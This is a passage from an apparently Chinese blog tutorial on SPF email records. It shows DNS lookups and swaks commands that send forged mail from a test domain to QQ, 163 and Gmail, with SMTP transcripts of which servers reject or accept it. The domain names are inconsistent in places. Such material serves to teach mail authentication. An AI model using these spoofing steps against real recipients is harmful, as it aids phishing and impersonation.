class="hljs-number">107.195</span><br>ns-cnc2<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">58.251</span>.<span class="hljs-number">103.109</span><br>ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  AAAA IPv6 <span class="hljs-selector-tag">address</span> = <span class="hljs-number">2402</span>:<span class="hljs-number">4</span>e00:<span class="hljs-number">8030</span>::<span class="hljs-number">3</span><br><br>D:\&gt;nslookup -q=txt qq-<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.mail</span><span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span><br>服务器:  UnKnown<br>Address:  <span class="hljs-number">10.211</span>.<span class="hljs-number">1.8</span><br><br>非权威应答:<br>qq-<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.mail</span><span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>        <span class="hljs-selector-tag">text</span> =<br><br>        <span class="hljs-string">&quot;v=spf1 ip4:101.226.139.0/25 ip4:101.91.43.0/25 ip4:101.91.44.128/25 ip4:112.64.237.128/25 ip4:116.128.173.0/25 ip4:121.51.40.128/25 ip4:121.51.6.0/25 ip4:162.62.52.214 ip4:162.62.55.67 ip4:162.62.57.0/24 ip4:162.62.58.211 ip4:162.62.58.216 -all&quot;</span><br><br>mail<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>     nameserver = ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span><br>mail<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>     nameserver = ns-cnc2<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span><br>ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">116.128</span>.<span class="hljs-number">153.20</span><br>ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">58.251</span>.<span class="hljs-number">103.109</span><br>ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">111.161</span>.<span class="hljs-number">107.195</span><br>ns-cnc2<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">58.251</span>.<span class="hljs-number">103.109</span><br>ns-cnc2<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  internet <span class="hljs-selector-tag">address</span> = <span class="hljs-number">111.161</span>.<span class="hljs-number">107.195</span><br>ns-cnc1<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>  AAAA IPv6 <span class="hljs-selector-tag">address</span> = <span class="hljs-number">2402</span>:<span class="hljs-number">4</span>e00:<span class="hljs-number">8030</span>::<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h5 id="没有spf的记录"><a href="#没有spf的记录" class="headerlink" title="没有spf的记录"></a><strong>没有spf的记录</strong></h5><p>nslookup -type&#x3D;txt 165.com</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">D:\&gt;nslookup -<span class="hljs-keyword">type</span>=txt <span class="hljs-number">165.</span>com<br>服务器:  <span class="hljs-type">UnKnown</span><br>Address:  <span class="hljs-number">10.211</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span><br><br><span class="hljs-number">165.</span>com<br>        <span class="hljs-keyword">primary</span> <span class="hljs-type">name</span> <span class="hljs-keyword">server</span> = coby.ns.cloudflare.com<br>        responsible mail addr = dns.cloudflare.com<br>        <span class="hljs-type">serial</span>  = <span class="hljs-number">2036766500</span><br>        <span class="hljs-keyword">refresh</span> = <span class="hljs-number">10000</span> (<span class="hljs-number">2</span> hours <span class="hljs-number">46</span> mins <span class="hljs-number">40</span> secs)<br>        retry   = <span class="hljs-number">2400</span> (<span class="hljs-number">40</span> mins)<br>        expire  = <span class="hljs-number">604800</span> (<span class="hljs-number">7</span> days)<br>        <span class="hljs-keyword">default</span> TTL = <span class="hljs-number">3600</span> (<span class="hljs-number">1</span> hour)<br></code></pre></td></tr></table></figure><h4 id="mac-linux"><a href="#mac-linux" class="headerlink" title="mac &#x2F; linux"></a><strong>mac &#x2F; linux</strong></h4><h5 id="dig"><a href="#dig" class="headerlink" title="dig"></a><strong>dig</strong></h5><p>​<strong>dig -t txt domain</strong></p><h5 id="host"><a href="#host" class="headerlink" title="host"></a><strong>host</strong></h5><p>​<strong>host -t txt domain</strong></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dns">(base) [root@<span class="hljs-number">110</span> ~]# host -t txt qq.com<br>qq.com descriptive text &quot;v=spf1 include:spf.mail.qq.com -all&quot;<br><br>(base) [root@<span class="hljs-number">110</span> ~]# host -t txt spf.mail.qq.com<br>spf.mail.qq.com descriptive text &quot;v=spf1 include:qq-a.mail.qq.com include:qq-b.mail.qq.com include:qq-c.mail.qq.com include:biz-a.mail.qq.com include:biz-b.mail.qq.com include:biz-c.mail.qq.com include:biz-d.mail.qq.com -all&quot;<br><br>(base) [root@<span class="hljs-number">110</span> ~]# host -t txt qq-a.mail.qq.com<br>qq-a.mail.qq.com descriptive text &quot;v=spf1 ip<span class="hljs-number">4:101.226.139</span>.<span class="hljs-number">0</span>/<span class="hljs-number">25</span> ip<span class="hljs-number">4:101.91.43</span>.<span class="hljs-number">0</span>/<span class="hljs-number">25</span> ip<span class="hljs-number">4:101.91.44</span>.<span class="hljs-number">128</span>/<span class="hljs-number">25</span> ip<span class="hljs-number">4:112.64.237</span>.<span class="hljs-number">128</span>/<span class="hljs-number">25</span> ip<span class="hljs-number">4:116.128.173</span>.<span class="hljs-number">0</span>/<span class="hljs-number">25</span> ip<span class="hljs-number">4:121.51.40</span>.<span class="hljs-number">128</span>/<span class="hljs-number">25</span> ip<span class="hljs-number">4:121.51.6</span>.<span class="hljs-number">0</span>/<span class="hljs-number">25</span> ip<span class="hljs-number">4:162.62.52</span>.<span class="hljs-number">214</span> ip<span class="hljs-number">4:162.62.55</span>.<span class="hljs-number">67</span> ip<span class="hljs-number">4:162.62.57</span>.<span class="hljs-number">0</span>/<span class="hljs-number">24</span> ip<span class="hljs-number">4:162.62.58</span>.<span class="hljs-number">211</span> ip<span class="hljs-number">4:162.62.58</span>.<span class="hljs-number">216</span> -all&quot;<br></code></pre></td></tr></table></figure><h3 id="设置方法"><a href="#设置方法" class="headerlink" title="设置方法"></a><strong>设置方法</strong></h3><p>也可以说spf记录就是DNS解析记录</p><p>在阿里云上，可以直接添加一条记录</p><p>v&#x3D;spf1 ip4:121.43.138.1 -all</p><p>表示只有从 121.43.138.1 发送的邮件为合法邮件，其他的全部拒绝。</p><h3 id="软硬拒绝"><a href="#软硬拒绝" class="headerlink" title="软硬拒绝"></a>软硬拒绝</h3><h4 id="软拒绝"><a href="#软拒绝" class="headerlink" title="软拒绝"></a>软拒绝</h4><p>~ 软拒绝，硬拒绝会丢弃很多邮件，为避免这种情况，会设置为软拒绝，如果设置软拒绝，表示发件IP非法，但是不采取强硬措施，可能会标为垃圾邮件等</p><p>test.site的 SPF 设置为软拒绝</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">┌──(root㉿<span class="hljs-number">61804e0083</span>af)-[/]<br>└─<span class="hljs-comment"># host -t txt test.site</span><br>vict.site descriptive <span class="hljs-built_in">text</span> <span class="hljs-string">&quot;v=spf1 ip4:121.43.138.1 ~all&quot;</span><br></code></pre></td></tr></table></figure><h5 id="软拒绝-伪造的邮件QQ邮箱拒绝"><a href="#软拒绝-伪造的邮件QQ邮箱拒绝" class="headerlink" title="软拒绝-伪造的邮件QQ邮箱拒绝"></a>软拒绝-伪造的邮件QQ邮箱拒绝</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs clean">┌──(root㉿<span class="hljs-number">61804e0083</span>af)-[/]<br>└─# swaks --to test@foxmail.com --<span class="hljs-keyword">from</span> admin@test.site --body <span class="hljs-string">&quot;~all to qq&quot;</span><br>=== Trying mx3.qq.com:<span class="hljs-number">25.</span>..<br>=== Connected to mx3.qq.com.<br>&lt;-  <span class="hljs-number">220</span> newxmmxszb1<span class="hljs-number">-2.</span>qq.com MX QQ Mail Server.<br> -&gt; EHLO <span class="hljs-number">61804e0083</span>af<br>&lt;-  <span class="hljs-number">250</span>-newxmmxszb1<span class="hljs-number">-2.</span>qq.com<br>&lt;-  <span class="hljs-number">250</span>-STARTTLS<br>&lt;-  <span class="hljs-number">250</span><span class="hljs-number">-8</span>BITMIME<br>&lt;-  <span class="hljs-number">250</span>-SIZE <span class="hljs-number">73400320</span><br>&lt;-  <span class="hljs-number">250</span> OK<br> -&gt; MAIL FROM:&lt;admin@test.site&gt;<br>&lt;-  <span class="hljs-number">250</span> OK<br> -&gt; RCPT TO:&lt;test@foxmail.com&gt;<br>&lt;-  <span class="hljs-number">250</span> OK<br> -&gt; DATA<br>&lt;-  <span class="hljs-number">354</span> End data <span class="hljs-keyword">with</span> &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;.<br> -&gt; Date: Sun, <span class="hljs-number">09</span> Apr <span class="hljs-number">2023</span> <span class="hljs-number">08</span>:<span class="hljs-number">36</span>:<span class="hljs-number">55</span> +<span class="hljs-number">0000</span><br> -&gt; To: test@foxmail.com<br> -&gt; From: admin@test.site<br> -&gt; Subject: test Sun, <span class="hljs-number">09</span> Apr <span class="hljs-number">2023</span> <span class="hljs-number">08</span>:<span class="hljs-number">36</span>:<span class="hljs-number">55</span> +<span class="hljs-number">0000</span><br> -&gt; Message-Id: &lt;<span class="hljs-number">20230409083655.000017</span>@<span class="hljs-number">61804e0083</span>af&gt;<br> -&gt; X-Mailer: swaks v20201014<span class="hljs-number">.0</span> jetmore.org/john/<span class="hljs-keyword">code</span>/swaks/<br> -&gt; <br> -&gt; ~all to qq<br> -&gt; <br> -&gt; <br> -&gt; .<br><br>&lt;** <span class="hljs-number">550</span> SPF check failed [MO+TD704vLucbv7Hd8BASEhQm5HgwZ88L3vGy9OWHck+hKp4HTLoROmFlo7u7dv/KQ==  IP: <span class="hljs-number">61.135</span><span class="hljs-number">.152</span><span class="hljs-number">.141</span>]. https:<span class="hljs-comment">//service.mail.qq.com/detail/122/72.</span><br> -&gt; QUIT<br>&lt;-  <span class="hljs-number">221</span> Bye.<br>=== Connection closed <span class="hljs-keyword">with</span> remote host.<br><br></code></pre></td></tr></table></figure><p>提示SPF检查失败</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">550 SPF<span class="hljs-built_in"> check </span>failed [MO+TD704vLucbv7Hd8BASEhQm5HgwZ88L3vGy9OWHck+hKp4HTLoROmFlo7u7dv/KQ==  IP: 61.135.152.141]. https://service.mail.qq.com/detail/122/72.<br></code></pre></td></tr></table></figure><h5 id="软拒绝-伪造的邮件163邮箱接收"><a href="#软拒绝-伪造的邮件163邮箱接收" class="headerlink" title="软拒绝-伪造的邮件163邮箱接收"></a>软拒绝-伪造的邮件163邮箱接收</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs clean">┌──(root㉿<span class="hljs-number">61804e0083</span>af)-[/]<br>└─# swaks --to test@<span class="hljs-number">163.</span>com --<span class="hljs-keyword">from</span> admin@test.site --body <span class="hljs-string">&quot;all forgery to 163 &quot;</span><br>=== Trying <span class="hljs-number">163</span>mx02.mxmail.netease.com:<span class="hljs-number">25.</span>..<br>=== Connected to <span class="hljs-number">163</span>mx02.mxmail.netease.com.<br>&lt;-  <span class="hljs-number">220</span> <span class="hljs-number">163.</span>com Anti-spam GT for Coremail System (<span class="hljs-number">163</span>com[<span class="hljs-number">20141201</span>])<br> -&gt; EHLO <span class="hljs-number">61804e0083</span>af<br>&lt;-  <span class="hljs-number">250</span>-mail<br>&lt;-  <span class="hljs-number">250</span>-PIPELINING<br>&lt;-  <span class="hljs-number">250</span>-AUTH LOGIN PLAIN<br>&lt;-  <span class="hljs-number">250</span>-AUTH=LOGIN PLAIN<br>&lt;-  <span class="hljs-number">250</span>-coremail <span class="hljs-number">1</span>Uxr2xKj7kG0xkI17xGrU7I0s8FY2U3Uj8Cz28x1UUUUU7Ic2I0Y2Ur8Yv9BUCa0xDrUUUUj<br>&lt;-  <span class="hljs-number">250</span>-STARTTLS<br>&lt;-  <span class="hljs-number">250</span>-SIZE <span class="hljs-number">73400320</span><br>&lt;-  <span class="hljs-number">250</span> <span class="hljs-number">8</span>BITMIME<br> -&gt; MAIL FROM:&lt;admin@test.site&gt;<br>&lt;-  <span class="hljs-number">250</span> Mail OK<br> -&gt; RCPT TO:&lt;test@<span class="hljs-number">163.</span>com&gt;<br>&lt;-  <span class="hljs-number">250</span> Mail OK<br> -&gt; DATA<br>&lt;-  <span class="hljs-number">354</span> End data <span class="hljs-keyword">with</span> &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;<br> -&gt; Date: Sun, <span class="hljs-number">09</span> Apr <span class="hljs-number">2023</span> <span class="hljs-number">08</span>:<span class="hljs-number">49</span>:<span class="hljs-number">46</span> +<span class="hljs-number">0000</span><br> -&gt; To: test@<span class="hljs-number">163.</span>com<br> -&gt; From: admin@test.site<br> -&gt; Subject: test Sun, <span class="hljs-number">09</span> Apr <span class="hljs-number">2023</span> <span class="hljs-number">08</span>:<span class="hljs-number">49</span>:<span class="hljs-number">46</span> +<span class="hljs-number">0000</span><br> -&gt; Message-Id: &lt;<span class="hljs-number">20230409084946.000022</span>@<span class="hljs-number">61804e0083</span>af&gt;<br> -&gt; X-Mailer: swaks v20201014<span class="hljs-number">.0</span> jetmore.org/john/<span class="hljs-keyword">code</span>/swaks/<br> -&gt; <br> -&gt; all forgery to <span class="hljs-number">163</span> <br> -&gt; <br> -&gt; <br> -&gt; .<br>&lt;-  <span class="hljs-number">250</span> Mail OK queued <span class="hljs-keyword">as</span> zwqz-mx-mta-g3<span class="hljs-number">-3</span>,_____wD3hm4rfDJkLRh1AQ-<span class="hljs-number">-.34322</span>S2 <span class="hljs-number">1681030189</span><br> -&gt; QUIT<br>&lt;-  <span class="hljs-number">221</span> Bye<br>=== Connection closed <span class="hljs-keyword">with</span> remote host.<br></code></pre></td></tr></table></figure><p>会在信头的Authentication-Results字段中显示 spf 为软失败</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Authentication-Results: zwqz-mx-mta-g3-3; <span class="hljs-attribute">spf</span>=softfail smtp.<span class="hljs-attribute">mail</span>=admin@test.site;<br></code></pre></td></tr></table></figure><h5 id="软拒绝-伪造的邮件google邮箱拒绝"><a href="#软拒绝-伪造的邮件google邮箱拒绝" class="headerlink" title="软拒绝-伪造的邮件google邮箱拒绝"></a>软拒绝-伪造的邮件google邮箱拒绝</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs clean">┌──(root㉿c87bd1816ee7)-[/]<br>└─# swaks --to test@gmail.com --<span class="hljs-keyword">from</span> admin@test.site --body <span class="hljs-string">&quot;all forgery to google &quot;</span><br>=== Trying gmail-smtp-<span class="hljs-keyword">in</span>.l.google.com:<span class="hljs-number">25.</span>..<br>=== Connected to gmail-smtp-<span class="hljs-keyword">in</span>.l.google.com.<br>&lt;-  <span class="hljs-number">220</span> mx.google.com ESMTP u17<span class="hljs-number">-20020</span>a63ef11000000b004fba312c235si5393252pgh<span class="hljs-number">.411</span> - gsmtp<br> -&gt; EHLO c87bd1816ee7<br>&lt;-  <span class="hljs-number">250</span>-mx.google.com at your service, [<span class="hljs-number">111.194</span><span class="hljs-number">.122</span><span class="hljs-number">.157</span>]<br>&lt;-  <span class="hljs-number">250</span>-SIZE <span class="hljs-number">157286400</span><br>&lt;-  <span class="hljs-number">250</span><span class="hljs-number">-8</span>BITMIME<br>&lt;-  <span class="hljs-number">250</span>-STARTTLS<br>&lt;-  <span class="hljs-number">250</span>-ENHANCEDSTATUSCODES<br>&lt;-  <span class="hljs-number">250</span>-PIPELINING<br>&lt;-  <span class="hljs-number">250</span>-CHUNKING<br>&lt;-  <span class="hljs-number">250</span> SMTPUTF8<br> -&gt; MAIL FROM:&lt;admin@test.site&gt;<br>&lt;-  <span class="hljs-number">250</span> <span class="hljs-number">2.1</span><span class="hljs-number">.0</span> OK u17<span class="hljs-number">-20020</span>a63ef11000000b004fba312c235si5393252pgh<span class="hljs-number">.411</span> - gsmtp<br> -&gt; RCPT TO:&lt;test@gmail.com&gt;<br>&lt;-  <span class="hljs-number">250</span> <span class="hljs-number">2.1</span><span class="hljs-number">.5</span> OK u17<span class="hljs-number">-20020</span>a63ef11000000b004fba312c235si5393252pgh<span class="hljs-number">.411</span> - gsmtp<br> -&gt; DATA<br>&lt;-  <span class="hljs-number">354</span>  Go ahead u17<span class="hljs-number">-20020</span>a63ef11000000b004fba312c235si5393252pgh<span class="hljs-number">.411</span> - gsmtp<br> -&gt; Date: Sat, <span class="hljs-number">08</span> Apr <span class="hljs-number">2023</span> <span class="hljs-number">07</span>:<span class="hljs-number">08</span>:<span class="hljs-number">31</span> +<span class="hljs-number">0000</span><br> -&gt; To: test@gmail.com<br> -&gt; From: admin@test.site<br> -&gt; Subject: test Sat, <span class="hljs-number">08</span> Apr <span class="hljs-number">2023</span> <span class="hljs-number">07</span>:<span class="hljs-number">08</span>:<span class="hljs-number">31</span> +<span class="hljs-number">0000</span><br> -&gt; Message-Id: &lt;<span class="hljs-number">20230408070831.000062</span>@c87bd1816ee7&gt;<br> -&gt; X-Mailer: swaks v20201014<span class="hljs-number">.0</span> jetmore.org/john/<span class="hljs-keyword">code</span>/swaks/<br> -&gt;<br> -&gt; all forgery to google<br> -&gt;<br> -&gt;<br> -&gt; .<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span> The MAIL FROM domain [vict.site] has an SPF record <span class="hljs-keyword">with</span> a hard fail<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span> policy (-all) but it fails to pass SPF checks <span class="hljs-keyword">with</span> the ip:<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span> [<span class="hljs-number">111.194</span><span class="hljs-number">.122</span><span class="hljs-number">.157</span>]. To best protect our users <span class="hljs-keyword">from</span> spam and phishing,<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span> the message has been blocked. Please visit<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span>  https:<span class="hljs-comment">//support.google.com/mail/answer/81126#authentication for more</span><br>&lt;** <span class="hljs-number">550</span> <span class="hljs-number">5.7</span><span class="hljs-number">.26</span> information. u17<span class="hljs-number">-20020</span>a63ef11000000b004fba312c235si5393252pgh<span class="hljs-number">.411</span> - gsmtp<br> -&gt; QUIT<br>*** Remote host closed connection unexpectedly.<br></code></pre></td></tr></table></figure><h4 id="硬拒绝"><a href="#硬拒绝" class="headerlink" title="硬拒绝"></a>硬拒绝</h4><p>- 硬拒绝，</p><p>-all</p><p>vict.site的 SPF 设置为硬拒绝</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">┌──(root㉿<span class="hljs-number">61804e0083</span>af)-[/]<br>└─<span class="hljs-comment"># host -t txt test.site</span><br>vict.site descriptive <span class="hljs-built_in">text</span> <span class="hljs-string">&quot;v=spf1 ip4:121.43.138.1 -all&quot;</span><br></code></pre></td></tr></table></figure><h5 id="硬拒绝-伪造的邮件QQ邮箱拒绝"><a href="#硬拒绝-伪造的邮件QQ邮箱拒绝" class="headerlink" title="硬拒绝-伪造的邮件QQ邮箱拒绝"></a>硬拒绝-伪造的邮件QQ邮箱拒绝</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs clean">┌──(root㉿<span class="hljs-number">61804e0083</span>af)-[/]<br>└─# swaks --to test@foxmail.com --<span class="hljs-keyword">from</span> admin@test.site --body <span class="hljs-string">&quot;all forgery to qq&quot;</span><br>=== Trying mx3.qq.com:<span class="hljs-number">25.</span>..<br>=== Connected to mx3.qq.com.<br>&lt;-  <span class="hljs-number">220</span> newxmmxszc6<span class="hljs-number">-2.</span>qq.com MX QQ Mail Server.<br> -&gt; EHLO <span class="hljs-number">61804e0083</span>af<br>&lt;-  <span class="hljs-number">250</span>-newxmmxszc6<span class="hljs-number">-2.</span>qq.com<br>&lt;-  <span class="hljs-number">250</span>-STARTTLS<br>&lt;-  <span class="hljs-number">250</span><span class="hljs-number">-8</span>BITMIME<br>&lt;-  <span class="hljs-number">250</span>-SIZE <span class="hljs-number">73400320</span><br>&lt;-  <span class="hljs-number">250</span> OK<br> -&gt; MAIL FROM:&lt;admin@test.site&gt;<br>&lt;-  <span class="hljs-number">250</span> OK<br> -&gt; RCPT TO:&lt;test@foxmail.com&gt;<br>&lt;-  <span class="hljs-number">250</span> OK<br> -&gt; DATA<br>&lt;-  <span class="hljs-number">354</span> End data <span class="hljs-keyword">with</span> &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;.<br> -&gt; Date: Sat, <span class="hljs-number">25</span> Mar <span class="hljs-number">2023</span> <span class="hljs-number">08</span>:<span class="hljs-number">58</span>:<span class="hljs-number">40</span> +<span class="hljs-number">0000</span><br> -&gt; To: test@foxmail.com<br> -&gt; From: admin@test.site<br> -&gt; Subject: test Sat, <span class="hljs-number">25</span> Mar <span class="hljs-number">2023</span> <span class="hljs-number">08</span>:<span class="hljs-number">58</span>:<span class="hljs-number">40</span> +<span class="hljs-number">0000</span><br> -&gt; Message-Id: &lt;<span class="hljs-number">20230325085840.000144</span>@<span class="hljs-number">61804e0083</span>af&gt;<br> -&gt; X-Mailer: swaks v20201014<span class="hljs-number">.0</span> jetmore.org/john/<span class="hljs-keyword">code</span>/swaks/<br> -&gt; <br> -&gt; all forgery to qq<br> -&gt; <br> -&gt; <br> -&gt; .<br>&lt;** <span class="hljs-number">550</span> SPF check failed [MPheda7H5r2WwJffxgMR71aZMUWOXuOHHJuHE5PjvsqCDHQ3wc0MOqsrBXS2MiwuNQ==  IP: <span class="hljs-number">61.135</span><span class="hljs-number">.152</span><span class="hljs-number">.140</span>]. https:<span class="hljs-comment">//service.mail.qq.com/detail/122/72.</span><br> -&gt; QUIT<br>&lt;-  <span class="hljs-number">221</span> Bye.<br>=== Connection closed <span class="hljs-keyword">with</span> remote host.<br></code></pre></td></tr></table></figure><h5 id="硬拒绝-伪造的邮件163邮箱拒绝"><a href="#硬拒绝-伪造的邮件163邮箱拒绝" class="headerlink" title="硬拒绝-伪造的邮件163邮箱拒绝"></a>硬拒绝-伪造的邮件163邮箱拒绝</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs clean">┌──(root㉿<span class="hljs-number">61804e0083</span>af)-[/]<br>└─# swaks --to test@<span class="hljs-number">163.</span>com --<span class="hljs-keyword">from</span> admin@test.site --body <span class="hljs-string">&quot;all forgery to 163 &quot;</span><br>=== Trying <span class="hljs-number">163</span>mx03.mxmail.netease.com:<span class="hljs-number">25.</span>..<br>=== Connected to <span class="hljs-number">163</span>mx03.mxmail.netease.com.<br>&lt;-  <span class="hljs-number">220</span> <span class="hljs-number">163.</span>com Anti-spam GT for Coremail System (<span class="hljs-number">163</span>com[<span class="hljs-number">20141201</span>])<br> -&gt; EHLO <span class="hljs-number">61804e0083</span>af<br>&lt;-  <span class="hljs-number">250</span>-mail<br>&lt;-  <span class="hljs-number">250</span>-PIPELINING<br>&lt;-  <span class="hljs-number">250</span>-AUTH LOGIN PLAIN<br>&lt;-  <span class="hljs-number">250</span>-AUTH=LOGIN PLAIN<br>&lt;-  <span class="hljs-number">250</span>-coremail <span class="hljs-number">1</span>Uxr2xKj7kG0xkI17xGrU7I0s8FY2U3Uj8Cz28x1UUUUU7Ic2I0Y2UFbexPCUCa0xDrUUUUj<br>&lt;-  <span class="hljs-number">250</span>-STARTTLS<br>&lt;-  <span class="hljs-number">250</span>-SIZE <span class="hljs-number">73400320</span><br>&lt;-  <span class="hljs-number">250</span> <span class="hljs-number">8</span>BITMIME<br> -&gt; MAIL FROM:&lt;admin@test.site&gt;<br>&lt;-  <span class="hljs-number">250</span> Mail OK<br> -&gt; RCPT TO:&lt;test@<span class="hljs-number">163.</span>com&gt;<br>&lt;-  <span class="hljs-number">250</span> Mail OK<br> -&gt; DATA<br>&lt;-  <span class="hljs-number">354</span> End data <span class="hljs-keyword">with</span> &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;<br> -&gt; Date: Sat, <span class="hljs-number">25</span> Mar <span class="hljs-number">2023</span> <span class="hljs-number">08</span>:<span class="hljs-number">53</span>:<span class="hljs-number">24</span> +<span class="hljs-number">0000</span><br> -&gt; To: test@<span 